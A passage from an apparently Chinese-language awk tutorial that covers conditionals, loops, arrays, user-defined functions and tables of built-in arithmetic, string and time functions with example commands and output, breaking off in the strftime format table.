<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@rocky8:~]# awk <span class="string">&#x27;BEGIN &#123;</span></span><br><span class="line"><span class="string">&gt;     num = 11; </span></span><br><span class="line"><span class="string">&gt;     if (num % 2 == 0) printf &quot;%d 是偶数\n&quot;, num; </span></span><br><span class="line"><span class="string">&gt;     else printf &quot;%d 是奇数\n&quot;, num </span></span><br><span class="line"><span class="string">&gt; &#125;&#x27;</span></span><br><span class="line">11 是奇数</span><br><span class="line">[root@rocky8:~]# awk <span class="string">&#x27;BEGIN &#123;num = 11; if (num % 2 == 0) printf &quot;%d 是偶数\n&quot;, num; else printf &quot;%d 是奇数\n&quot;, num &#125;&#x27;</span></span><br><span class="line">11 是奇数</span><br></pre></td></tr></table></figure>
<p>可以创建多个 IF - ELSE 格式的判断语句来实现多个条件的判断：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ awk <span class="string">&#x27;BEGIN &#123;</span></span><br><span class="line"><span class="string">a=30;</span></span><br><span class="line"><span class="string">if (a==10)</span></span><br><span class="line"><span class="string">  print &quot;a = 10&quot;;</span></span><br><span class="line"><span class="string">else if (a == 20)</span></span><br><span class="line"><span class="string">  print &quot;a = 20&quot;;</span></span><br><span class="line"><span class="string">else if (a == 30)</span></span><br><span class="line"><span class="string">  print &quot;a = 30&quot;;</span></span><br><span class="line"><span class="string">&#125;&#x27;</span></span><br></pre></td></tr></table></figure>
<p>输出结果：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@rocky8:~]# awk <span class="string">&#x27;BEGIN &#123;</span></span><br><span class="line"><span class="string">&gt; a=30;</span></span><br><span class="line"><span class="string">&gt; if (a==10)</span></span><br><span class="line"><span class="string">&gt;   print &quot;a = 10&quot;;</span></span><br><span class="line"><span class="string">&gt; else if (a == 20)</span></span><br><span class="line"><span class="string">&gt;   print &quot;a = 20&quot;;</span></span><br><span class="line"><span class="string">&gt; else if (a == 30)</span></span><br><span class="line"><span class="string">&gt;   print &quot;a = 30&quot;;</span></span><br><span class="line"><span class="string">&gt; &#125;&#x27;</span></span><br><span class="line">a = 30</span><br></pre></td></tr></table></figure>
<h4 id="循环语句For-While">循环语句For&amp;While</h4>
<p>For 循环的语法如下：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> (initialisation; condition; increment/decrement)</span><br><span class="line">    action</span><br></pre></td></tr></table></figure>
<p>下面的例子使用 For 循环输出数字 1 至 5：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python@ubuntu:~/test$ awk <span class="string">&#x27;BEGIN &#123; for (i = 1; i &lt;= 5; ++i) print i &#125;&#x27;</span></span><br><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td></tr></table></figure>
<p>While 循环的语法如下：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="keyword">while</span> (condition)</span><br><span class="line">    action</span><br></pre></td></tr></table></figure>
<p>下面是使用 While 循环输出数字 1 到 5 的例子：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python@ubuntu:~/test$ awk <span class="string">&#x27;BEGIN &#123;i = 1; while (i &lt; 6) &#123; print i; ++i &#125; &#125;&#x27;</span></span><br><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td></tr></table></figure>
<p>在下面的示例子中，当计算的和大于 50 的时候使用 break 结束循环：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ awk <span class="string">&#x27;BEGIN &#123;</span></span><br><span class="line"><span class="string">   sum = 0; for (i = 0; i &lt; 20; ++i) &#123; </span></span><br><span class="line"><span class="string">      sum += i; if (sum &gt; 50) break; else print &quot;Sum =&quot;, sum </span></span><br><span class="line"><span class="string">   &#125; </span></span><br><span class="line"><span class="string">&#125;&#x27;</span></span><br></pre></td></tr></table></figure>
<p>输出结果为：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python@ubuntu:~/test$ awk <span class="string">&#x27;BEGIN &#123;</span></span><br><span class="line"><span class="string">&gt;    sum = 0; for (i = 0; i &lt; 20; ++i) &#123; </span></span><br><span class="line"><span class="string">&gt;       sum += i; if (sum &gt; 50) break; else print &quot;Sum =&quot;, sum </span></span><br><span class="line"><span class="string">&gt;    &#125; </span></span><br><span class="line"><span class="string">&gt; &#125;&#x27;</span></span><br><span class="line">Sum = 0</span><br><span class="line">Sum = 1</span><br><span class="line">Sum = 3</span><br><span class="line">Sum = 6</span><br><span class="line">Sum = 10</span><br><span class="line">Sum = 15</span><br><span class="line">Sum = 21</span><br><span class="line">Sum = 28</span><br><span class="line">Sum = 36</span><br><span class="line">Sum = 45</span><br></pre></td></tr></table></figure>
<p>Continue 语句用于在循环体内部结束本次循环，从而直接进入下一次循环迭代。</p>
<p>下面的例子输出 1 到 20 之间的偶数：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python@ubuntu:~/test$ awk <span class="string">&#x27;BEGIN &#123;for (i = 1; i &lt;= 20; ++i) &#123;if (i % 2 == 0) print i ; else continue&#125; &#125;&#x27;</span></span><br><span class="line">2</span><br><span class="line">4</span><br><span class="line">6</span><br><span class="line">8</span><br><span class="line">10</span><br><span class="line">12</span><br><span class="line">14</span><br><span class="line">16</span><br><span class="line">18</span><br><span class="line">20</span><br></pre></td></tr></table></figure>
<p>Exit 用于结束脚本程序的执行。</p>
<p>该函数接受一个整数作为参数表示 AWK 进程结束状态。 如果没有提供该参数，其默认状态为 0。</p>
<p>下面例子中当和大于 50 时结束 AWK 程序。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ awk <span class="string">&#x27;BEGIN &#123;</span></span><br><span class="line"><span class="string">   sum = 0; for (i = 0; i &lt; 20; ++i) &#123;</span></span><br><span class="line"><span class="string">      sum += i; if (sum &gt; 50) exit(10); else print &quot;Sum =&quot;, sum </span></span><br><span class="line"><span class="string">   &#125; </span></span><br><span class="line"><span class="string">&#125;&#x27;</span></span><br></pre></td></tr></table></figure>
<p>输出结果为：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python@ubuntu:~/test$ awk <span class="string">&#x27;BEGIN &#123;</span></span><br><span class="line"><span class="string">&gt;    sum = 0; for (i = 0; i &lt; 20; ++i) &#123;</span></span><br><span class="line"><span class="string">&gt;       sum += i; if (sum &gt; 50) exit(10); else print &quot;Sum =&quot;, sum </span></span><br><span class="line"><span class="string">&gt;    &#125; </span></span><br><span class="line"><span class="string">&gt; &#125;&#x27;</span></span><br><span class="line">Sum = 0</span><br><span class="line">Sum = 1</span><br><span class="line">Sum = 3</span><br><span class="line">Sum = 6</span><br><span class="line">Sum = 10</span><br><span class="line">Sum = 15</span><br><span class="line">Sum = 21</span><br><span class="line">Sum = 28</span><br><span class="line">Sum = 36</span><br><span class="line">Sum = 45</span><br><span class="line">python@ubuntu:~/test$ <span class="built_in">echo</span> $?</span><br><span class="line">10</span><br></pre></td></tr></table></figure>
<h4 id="awk数组">awk数组</h4>
<p>AWK的数组底层数据结构是散列表，索引可以是数字或字符串。</p>
<p>数组使用的语法格式：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">array_name[index]=value</span><br></pre></td></tr></table></figure>
<p>创建数组并访问数组元素：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ awk <span class="string">&#x27;BEGIN &#123;</span></span><br><span class="line"><span class="string">sites[&quot;taobao&quot;]=&quot;www.taobao.com&quot;;</span></span><br><span class="line"><span class="string">sites[&quot;google&quot;]=&quot;www.google.com&quot;</span></span><br><span class="line"><span class="string">print sites[&quot;taobao&quot;] &quot;\n&quot; sites[&quot;google&quot;]</span></span><br><span class="line"><span class="string">&#125;&#x27;</span></span><br></pre></td></tr></table></figure>
<p>删除数组元素语法格式：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">delete array_name[index]</span><br></pre></td></tr></table></figure>
<p>下面的例子中，数组中的 google 元素被删除（删除命令没有输出）：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ awk <span class="string">&#x27;BEGIN &#123;</span></span><br><span class="line"><span class="string">sites[&quot;taobao&quot;]=&quot;www.taobao.com&quot;;</span></span><br><span class="line"><span class="string">sites[&quot;google&quot;]=&quot;www.google.com&quot;</span></span><br><span class="line"><span class="string">delete sites[&quot;google&quot;];</span></span><br><span class="line"><span class="string">print sites[&quot;google&quot;]</span></span><br><span class="line"><span class="string">&#125;&#x27;</span></span><br></pre></td></tr></table></figure>
<p>AWK 本身不支持多维数组，不过我们可以很容易地使用一维数组模拟实现多维数组。</p>
<p>如下示例为一个 3x3 的三维数组：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">100 200 300</span><br><span class="line">400 500 600</span><br><span class="line">700 800 900</span><br></pre></td></tr></table></figure>
<p>以上实例中，<code>array[0][0]</code> 存储 100，<code>array[0][1]</code> 存储 200 ，依次类推。为了在 <code>array[0][0]</code> 处存储 100, 可以使用字符串0,0 作为索引： array[“0,0”] = 100。</p>
<p>下面是模拟二维数组的例子：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ awk <span class="string">&#x27;BEGIN &#123;</span></span><br><span class="line"><span class="string">array[&quot;0,0&quot;] = 100;</span></span><br><span class="line"><span class="string">array[&quot;0,1&quot;] = 200;</span></span><br><span class="line"><span class="string">array[&quot;0,2&quot;] = 300;</span></span><br><span class="line"><span class="string">array[&quot;1,0&quot;] = 400;</span></span><br><span class="line"><span class="string">array[&quot;1,1&quot;] = 500;</span></span><br><span class="line"><span class="string">array[&quot;1,2&quot;] = 600;</span></span><br><span class="line"><span class="string"># 输出数组元素</span></span><br><span class="line"><span class="string">print &quot;array[0,0] = &quot; array[&quot;0,0&quot;];</span></span><br><span class="line"><span class="string">print &quot;array[0,1] = &quot; array[&quot;0,1&quot;];</span></span><br><span class="line"><span class="string">print &quot;array[0,2] = &quot; array[&quot;0,2&quot;];</span></span><br><span class="line"><span class="string">print &quot;array[1,0] = &quot; array[&quot;1,0&quot;];</span></span><br><span class="line"><span class="string">print &quot;array[1,1] = &quot; array[&quot;1,1&quot;];</span></span><br><span class="line"><span class="string">print &quot;array[1,2] = &quot; array[&quot;1,2&quot;];</span></span><br><span class="line"><span class="string">&#125;&#x27;</span></span><br></pre></td></tr></table></figure>
<p>执行上面的命令可以得到如下结果：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">array[0,0] = 100</span><br><span class="line">array[0,1] = 200</span><br><span class="line">array[0,2] = 300</span><br><span class="line">array[1,0] = 400</span><br><span class="line">array[1,1] = 500</span><br><span class="line">array[1,2] = 600</span><br></pre></td></tr></table></figure>
<p>在数组上可以执行很多操作，比如，使用 asort 完成数组元素的排序，或者使用 asorti 实现数组索引的排序等等。</p>
<h4 id="AWK-用户自定义函数">AWK 用户自定义函数</h4>
<p>自定义函数的语法格式为：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> function_name(argument1, argument2, ...)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">function</span> body</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>以下实例实现了两个简单函数，它们分别返回两个数值中的最小值和最大值。</p>
<p>文件 functions.awk 代码如下：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 返回最小值</span></span><br><span class="line"><span class="keyword">function</span> find_min(num1, num2)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (num1 &lt; num2)</span><br><span class="line">    <span class="built_in">return</span> num1</span><br><span class="line">  <span class="built_in">return</span> num2</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 返回最大值</span></span><br><span class="line"><span class="keyword">function</span> find_max(num1, num2)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (num1 &gt; num2)</span><br><span class="line">    <span class="built_in">return</span> num1</span><br><span class="line">  <span class="built_in">return</span> num2</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 主函数</span></span><br><span class="line"><span class="keyword">function</span> main(num1, num2)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment"># 查找最小值</span></span><br><span class="line">  result = find_min(10, 20)</span><br><span class="line">  <span class="built_in">print</span> <span class="string">&quot;Minimum =&quot;</span>, result</span><br><span class="line"></span><br><span class="line">  <span class="comment"># 查找最大值</span></span><br><span class="line">  result = find_max(10, 20)</span><br><span class="line">  <span class="built_in">print</span> <span class="string">&quot;Maximum =&quot;</span>, result</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 脚本从这里开始执行</span></span><br><span class="line">BEGIN &#123;</span><br><span class="line">  main(10, 20)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>执行 functions.awk 文件，可以得到如下的结果：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ awk -f functions.awk </span><br><span class="line">Minimum = 10</span><br><span class="line">Maximum = 20</span><br></pre></td></tr></table></figure>
<h4 id="AWK-内置函数">AWK 内置函数</h4>
<p>AWK 内置函数主要有以下几种：</p>
<ul class="lvl-0">
<li class="lvl-2">
<p>算数函数</p>
</li>
<li class="lvl-2">
<p>字符串函数</p>
</li>
<li class="lvl-2">
<p>时间函数</p>
</li>
<li class="lvl-2">
<p>位操作函数</p>
</li>
<li class="lvl-2">
<p>其它函数</p>
</li>
</ul>
<h4 id="算数函数">算数函数</h4>
<table>
<thead>
<tr>
<th><strong>函数名</strong></th>
<th><strong>说明</strong></th>
<th><strong>实例</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td>atan2( y, x )</td>
<td>返回 y/x 的反正切。</td>
<td><code>$ awk 'BEGIN &#123; PI = 3.14159265 x = -10 y = 10 result = atan2 (y,x) * 180 / PI; printf &quot;The arc tangent for (x=%f, y=%f) is %f degrees\n&quot;, x, y,  result &#125;'</code>输出结果为：<code>The arc tangent for (x=-10.000000, y=10.000000) is 135.000000 degrees</code></td>
</tr>
<tr>
<td>cos( x )</td>
<td>返回 x 的余弦；x 是弧度。</td>
<td><code>$ awk 'BEGIN &#123; PI = 3.14159265 param = 60 result = cos(param * PI /  180.0); printf &quot;The cosine of %f degrees is %f.\n&quot;, param, result &#125;'</code>输出结果为：<code>The cosine of 60.000000 degrees is 0.500000.</code></td>
</tr>
<tr>
<td>sin( x )</td>
<td>返回 x 的正弦；x 是弧度。</td>
<td><code>$ awk 'BEGIN &#123; PI = 3.14159265 param = 30.0 result = sin(param * PI /180) printf &quot;The sine of %f degrees is %f.\n&quot;, param, result &#125;'</code>输出结果为：<code>The sine of 30.000000 degrees is 0.500000.</code></td>
</tr>
<tr>
<td>exp( x )</td>
<td>返回 x 幂函数。</td>
<td><code>$ awk 'BEGIN &#123; param = 5 result = exp(param); printf &quot;The exponential value of %f is %f.\n&quot;, param, result &#125;'</code>输出结果为：<code>The exponential value of 5.000000 is 148.413159.</code></td>
</tr>
<tr>
<td>log( x )</td>
<td>返回 x 的自然对数。</td>
<td><code>$ awk 'BEGIN &#123; param = 5.5 result = log (param) printf &quot;log(%f) = %f\n&quot;, param, result &#125;'</code>输出结果为：<code>log(5.500000) = 1.704748</code></td>
</tr>
<tr>
<td>sqrt( x )</td>
<td>返回 x 平方根。</td>
<td><code>$ awk 'BEGIN &#123; param = 1024.0 result = sqrt(param) printf &quot;sqrt(%f) = %f\n&quot;, param, result &#125;'</code>输出结果为：<code>sqrt(1024.000000) = 32.000000</code></td>
</tr>
<tr>
<td>int( x )</td>
<td>返回 x 的截断至整数的值。</td>
<td><code>$ awk 'BEGIN &#123; param = 5.12345 result = int(param) print &quot;Truncated value =&quot;, result &#125;'</code>输出结果为：<code>Truncated value = 5</code></td>
</tr>
<tr>
<td>rand( )</td>
<td>返回任意数字 n，其中 0 &lt;= n &lt; 1。</td>
<td><code>$ awk 'BEGIN &#123; print &quot;Random num1 =&quot; , rand() print &quot;Random num2 =&quot; , rand() print &quot;Random num3 =&quot; , rand() &#125;'</code>输出结果为：<code>Random num1 = 0.237788 Random num2 = 0.291066 Random num3 = 0.845814</code></td>
</tr>
<tr>
<td>srand( [Expr] )</td>
<td>将 rand 函数的种子值设置为 Expr 参数的值，或如果省略 Expr 参数则使用某天的时间。返回先前的种子值。</td>
<td><code>$ awk 'BEGIN &#123; param = 10 printf &quot;srand() = %d\n&quot;, srand() printf &quot;srand(%d) = %d\n&quot;, param, srand(param) &#125;'</code>输出结果为：<code>srand() = 1 srand(10) = 1417959587</code></td>
</tr>
</tbody>
</table>
<h5 id="字符串函数">字符串函数</h5>
<table>
<thead>
<tr>
<th><strong>函数</strong></th>
<th><strong>说明</strong></th>
<th><strong>实例</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td>gsub( Ere, Repl, [ In ] )</td>
<td>gsub 是全局替换( global substitution )的缩写。除了正则表达式所有具体值被替代这点，它和 sub 函数完全一样地执行。</td>
<td><code>$ awk 'BEGIN &#123; str = &quot;Hello, World&quot; print &quot;String before replacement = &quot;  str gsub(&quot;World&quot;, &quot;Jerry&quot;, str) print &quot;String after replacement = &quot; str  &#125;'</code>输出结果为：<code>String before replacement = Hello, World String after replacement = Hello, Jerry</code></td>
</tr>
<tr>
<td>sub(regex,sub,string)</td>
<td>sub 函数执行一次子串替换。它将第一次出现的子串用 regex 替换。第三个参数是可选的，默认为 $0。</td>
<td><code>$ awk 'BEGIN &#123; str = &quot;Hello, World&quot; print &quot;String before replacement = &quot;  str sub(&quot;World&quot;, &quot;Jerry&quot;, str) print &quot;String after replacement = &quot; str  &#125;'</code>输出结果为：<code>String before replacement = Hello, World String after replacement = Hello, Jerry</code></td>
</tr>
<tr>
<td>substr(str, start, l)</td>
<td>substr 函数返回 str 字符串中从第 start 个字符开始长度为 l 的子串。如果没有指定 l 的值，返回 str 从第 start 个字符开始的后缀子串。</td>
<td><code>$ awk 'BEGIN &#123; str = &quot;Hello, World !!!&quot; subs = substr(str, 1, 5) print &quot;Substring = &quot; subs &#125;'</code>输出结果为：<code>Substring = Hello</code></td>
</tr>
<tr>
<td>index( String1, String2 )</td>
<td>在由 String1 参数指定的字符串（其中有出现 String2 指定的参数）中，返回位置，从 1 开始编号。如果 String2 参数不在 String1 参数中出现，则返回 0（零）。</td>
<td><code>$ awk 'BEGIN &#123; str = &quot;One Two Three&quot; subs = &quot;Two&quot; ret = index(str, subs)  printf &quot;Substring \&quot;%s\&quot; found at %d location.\n&quot;, subs, ret &#125;'</code>输出结果为：<code>Substring &quot;Two&quot; found at 5 location.</code></td>
</tr>
<tr>
<td>length [(String)]</td>
<td>返回 String 参数指定的字符串的长度（字符形式）。如果未给出 String 参数，则返回整个记录的长度（$0 记录变量）。</td>
<td><code>$ awk 'BEGIN &#123; str = &quot;Hello, World !!!&quot; print &quot;Length = &quot;, length(str) &#125;'</code>输出结果为：<code>Substring &quot;Two&quot; found at 5 location.</code></td>
</tr>
<tr>
<td>blength [(String)]</td>
<td>返回 String 参数指定的字符串的长度（以字节为单位）。如果未给出 String 参数，则返回整个记录的长度（$0 记录变量）。</td>
<td></td>
</tr>
<tr>
<td>substr( String, M, [ N ] )</td>
<td>返回具有 N 参数指定的字符数量子串。子串从 String 参数指定的字符串取得，其字符以 M 参数指定的位置开始。M 参数指定为将 String  参数中的第一个字符作为编号 1。如果未指定 N 参数，则子串的长度将是 M 参数指定的位置到 String 参数的末尾 的长度。</td>
<td><code>$ awk 'BEGIN &#123; str = &quot;Hello, World !!!&quot; subs = substr(str, 1, 5) print &quot;Substring = &quot; subs &#125;'</code>输出结果为：<code>Substring = Hello</code></td>
</tr>
<tr>
<td>match( String, Ere )</td>
<td>在 String 参数指定的字符串（Ere 参数指定的扩展正则表达式出现在其中）中返回位置（字符形式），从 1 开始编号，或如果 Ere  参数不出现，则返回 0（零）。RSTART 特殊变量设置为返回值。RLENGTH  特殊变量设置为匹配的字符串的长度，或如果未找到任何匹配，则设置为 -1（负一）。</td>
<td><code>$  awk 'BEGIN &#123; str = &quot;One Two Three&quot; subs = &quot;Two&quot; ret = match(str, subs)  printf &quot;Substring \&quot;%s\&quot; found at %d location.\n&quot;, subs, ret &#125;'</code>输出结果为：<code>Substring &quot;Two&quot; found at 5 location.</code></td>
</tr>
<tr>
<td>split( String, A, [Ere] )</td>
<td>将 String 参数指定的参数分割为数组元素 A[1], A[2], . . ., A[n]，并返回 n 变量的值。此分隔可以通过 Ere  参数指定的扩展正则表达式进行，或用当前字段分隔符（FS 特殊变量）来进行（如果没有给出 Ere  参数）。除非上下文指明特定的元素还应具有一个数字值，否则 A 数组中的元素用字符串值来创建。</td>
<td><code>$ awk 'BEGIN &#123; str = &quot;One,Two,Three,Four&quot; split(str, arr, &quot;,&quot;) print  &quot;Array contains following values&quot; for (i in arr) &#123; print arr[i] &#125; &#125;'</code>输出结果为：<code>Array contains following values One Two Three Four</code></td>
</tr>
<tr>
<td>tolower( String )</td>
<td>返回 String 参数指定的字符串，字符串中每个大写字符将更改为小写。大写和小写的映射由当前语言环境的 LC_CTYPE 范畴定义。</td>
<td><code>$ awk 'BEGIN &#123; str = &quot;HELLO, WORLD !!!&quot; print &quot;Lowercase string = &quot; tolower(str) &#125;'</code>输出结果为：<code>Lowercase string = hello, world !!!</code></td>
</tr>
<tr>
<td>toupper( String )</td>
<td>返回 String 参数指定的字符串，字符串中每个小写字符将更改为大写。大写和小写的映射由当前语言环境的 LC_CTYPE 范畴定义。</td>
<td><code>$ awk 'BEGIN &#123; str = &quot;hello, world !!!&quot; print &quot;Uppercase string = &quot; toupper(str) &#125;'</code>输出结果为：<code>Uppercase string = HELLO, WORLD !!!</code></td>
</tr>
<tr>
<td>sprintf(Format, Expr, Expr, . . . )</td>
<td>根据 Format 参数指定的 printf 子例程格式字符串来格式化 Expr 参数指定的表达式并返回最后生成的字符串。</td>
<td><code>$ awk 'BEGIN &#123; str = sprintf(&quot;%s&quot;, &quot;Hello, World !!!&quot;) print str &#125;'</code>输出结果为：<code>Hello, World !!!</code></td>
</tr>
<tr>
<td>strtonum(str)</td>
<td>strtonum 将字符串 str 转换为数值。 如果字符串以 0 开始，则将其当作十进制数；如果字符串以 0x 或 0X 开始，则将其当作十六进制数；否则，将其当作浮点数。</td>
<td><code>$ awk 'BEGIN &#123; print &quot;Decimal num = &quot; strtonum(&quot;123&quot;) print &quot;Octal num = &quot; strtonum(&quot;0123&quot;) print &quot;Hexadecimal num = &quot; strtonum(&quot;0x123&quot;) &#125;'</code>输出结果为：<code>Decimal num = 123 Octal num = 83 Hexadecimal num = 291</code></td>
</tr>
</tbody>
</table>
<p>**注：**<strong>Ere</strong> 部分可以是正则表达式。</p>
<p><strong>1、gsub、sub 使用</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ awk <span class="string">&#x27;BEGIN&#123;info=&quot;this is a test2012test!&quot;;gsub(/[0-9]+/,&quot;||&quot;,info);print info&#125;&#x27;</span></span><br><span class="line">this is a <span class="built_in">test</span>||<span class="built_in">test</span>!</span><br></pre></td></tr></table></figure>
<p><strong>2、查找字符串（index 使用）</strong></p>
<p>使用了三元运算符: <strong>表达式 ? 动作1 : 动作2</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ awk <span class="string">&#x27;BEGIN&#123;info=&quot;this is a test2012test!&quot;;print index(info,&quot;11111&quot;)?&quot;ok&quot;:&quot;no found&quot;;&#125;&#x27;</span></span><br><span class="line">no found</span><br><span class="line">$ awk <span class="string">&#x27;BEGIN&#123;info=&quot;this is a test2012test!&quot;;print index(info,&quot;is&quot;)?&quot;ok&quot;:&quot;no found&quot;;&#125;&#x27;</span></span><br><span class="line">ok</span><br><span class="line">$ awk <span class="string">&#x27;BEGIN&#123;info=&quot;this is a test2012test!&quot;;print index(info,&quot;test&quot;)?&quot;ok&quot;:&quot;no found&quot;;&#125;&#x27;</span></span><br><span class="line">ok</span><br></pre></td></tr></table></figure>
<p><strong>3、正则表达式匹配查找(match 使用）</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ awk <span class="string">&#x27;BEGIN&#123;info=&quot;this is a test2012test!&quot;;print match(info,/[0-9]+/)?&quot;ok&quot;:&quot;no found&quot;;&#125;&#x27;</span></span><br><span class="line">ok</span><br></pre></td></tr></table></figure>
<p><strong>4、截取字符串(substr使用）</strong></p>
<p>从第 4 个 字符开始，截取 10 个长度字符串。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ awk <span class="string">&#x27;BEGIN&#123;info=&quot;this is a test2012test!&quot;;print substr(info,4,10);&#125;&#x27;</span></span><br><span class="line">s is a tes</span><br></pre></td></tr></table></figure>
<p><strong>5、字符串分割（split使用）</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ awk <span class="string">&#x27;BEGIN&#123;info=&quot;this is a test&quot;;split(info,tA,&quot; &quot;);print length(tA);for(k in tA)&#123;print k,tA[k];&#125;&#125;&#x27;</span></span><br><span class="line">4</span><br><span class="line">2 is</span><br><span class="line">3 a</span><br><span class="line">4 <span class="built_in">test</span></span><br><span class="line">1 this</span><br></pre></td></tr></table></figure>
<p>分割 info，将 info 字符串使用空格切分为动态数组 tA。注意 awk for …in 循环，是一个无序的循环。 并不是从数组下标 1…n ，因此使用时候需要特别注意。</p>
<h5 id="时间函数">时间函数</h5>
<table>
<thead>
<tr>
<th><strong>函数名</strong></th>
<th><strong>说明</strong></th>
<th><strong>实例</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td>mktime( YYYY MM DD HH MM SS[ DST])</td>
<td>生成时间格式</td>
<td><code>$ awk 'BEGIN &#123; print &quot;Number of seconds since the Epoch = &quot; mktime(&quot;2014 12 14 30 20 10&quot;) &#125;'</code>输出结果为：<code>Number of seconds since the Epoch = 1418604610</code></td>
</tr>
<tr>
<td>strftime([format [, timestamp]])</td>
<td>格式化时间输出，将时间戳转为时间字符串 具体格式，见下表.</td>
<td><code>$ awk 'BEGIN &#123; print strftime(&quot;Time = %m/%d/%Y %H:%M:%S&quot;, systime()) &#125;'</code>输出结果为：<code>Time = 12/14/2014 22:08:42</code></td>
</tr>
<tr>
<td>systime()</td>
<td>得到时间戳,返回从1970年1月1日开始到当前时间(不计闰年)的整秒数</td>
<td><code>awk 'BEGIN&#123;now=systime();print now&#125;'</code>输出结果为：<code>1343210982</code></td>
</tr>
</tbody>
</table>
<p>strftime 日期和时间格式说明符:</p>
<table>
<thead>
<tr>
<th>序号</th>
<th>描述</th>
</tr>
</thead>
<tbody>
<tr>
<td>%a</td>
<td>星期缩写(Mon-Sun)。</td>
</tr>
<tr>
<td>%A</td>
<td>星期全称（Monday-Sunday）。</td>
</tr>
<tr>
<td>%b</td>
<td>月份缩写（Jan）。</td>
</tr>
<tr>
<td>%B</td>
<td>月份全称（January）。</td>
</tr>
<tr>
<td>%c</td>
<td>本地日期与时间。</td>
</tr>
<tr>
<td>%C</td>
<td>年份中的世纪部分，其值为年份整除100。</td>
</tr>
<tr>
<td>%d</td>
<td>十进制日期(01-31)</td>
</tr>
<tr>
<td>%D</td>
<td>等价于 %m/%d/%y.</td>
</tr>
<tr>
<td>%e</td>
<td>日期，如果只有一位数字则用空格补齐</td>
</tr>
<tr>
<td>%F</td>
<td>等价于 %Y-%m-%d，这也是 ISO 8601 标准日期格式。</td>
</tr>
<tr>
<td>%g</td>
<td>ISO8610 标准周所在的年份模除 100（00-99)。比如，1993 年 1 月 1 日属于 1992 年的第 53 周。所以，虽然它是 1993 年第 1 天，但是其　ISO8601 标准周所在年份却是 1992。同样，尽管 1973 年 12 月 31 日属于 1973 年但是它却属于  1994 年的第一周。所以 1973 年 12 月 31 日的 ISO8610　标准周所在的年是 1974 而不是 1973。</td>
</tr>
<tr>
<td>%G</td>
<td>ISO 标准周所在年份的全称。</td>
</tr>
<tr>
<td>%h</td>
<td>等价于 %b.</td>
</tr>
<tr>
<td>%H</td>
<td>用十进制表示的 24 小时格式的小时(00-23)</td>
</tr>
<tr>
<td>%I</td>
<td>用十进制表示的 12 小时格式的小时（00-12）</td>
</tr>
<tr>
<td>%j</td>
<td>一年中的第几天（001-366）</td>
</tr>
<tr>
<td>%m</td>
<td>月份（01-12）</td>
</tr>
<tr>
<td>%M</td>
<td>分钟数（00-59)</td>
</tr>
<tr>
<td>%n</td>
<td>换行符 (ASCII LF)</td>
</tr>
<tr>
<td>%p</td>
<td>十二进制表示法（AM/PM）</td>
</tr>
<tr>
<td>%r</td>
<td>十二进制表示法的时间（等价于 %I:%M:%S %p）。</td>
</tr>
<tr>
<td>%R</td>
<td>等价于 %H:%M。</td>
</tr>
<tr>
<td>%S</td>
<td>时间的秒数值（00-60）</td>
</tr>
<tr>
<td>%t</td>
<td>制表符 (tab)</td>
</tr>
<tr>
<td>%T</td>
<td>等价于 %H:%M:%S。</td>
</tr>
<tr>
<td>%u</td>
<td>以数字表示的星期(1-7),1 表示星期一。</td>
</tr>
<tr>
<td>%U</td>
<td>一年中的第几个星期（第一个星期天作为第一周的开始），00-53</td>
</tr>
<tr>
<td>%V</td>
<td>一年中的第几个星期（第一个星期一作为第一周的开始），01-53。</td>
</tr>
<tr>
<td>%w</td>
<td>以数字表示的星期（0-6），0表示星期日 。</td>
</tr>
<tr>
<td>%W</td>
<td>十进制表示的一年中的第几个星期（第一个星期一作为第一周的开始），00-53。</td>
</tr>
<tr>
<td>%x</td>
<td>本地日期表示</td>
</tr>
<tr>
<td>%X</td>
<td>本地时间表示</td>
</tr>
<tr>
<td>%y</td>
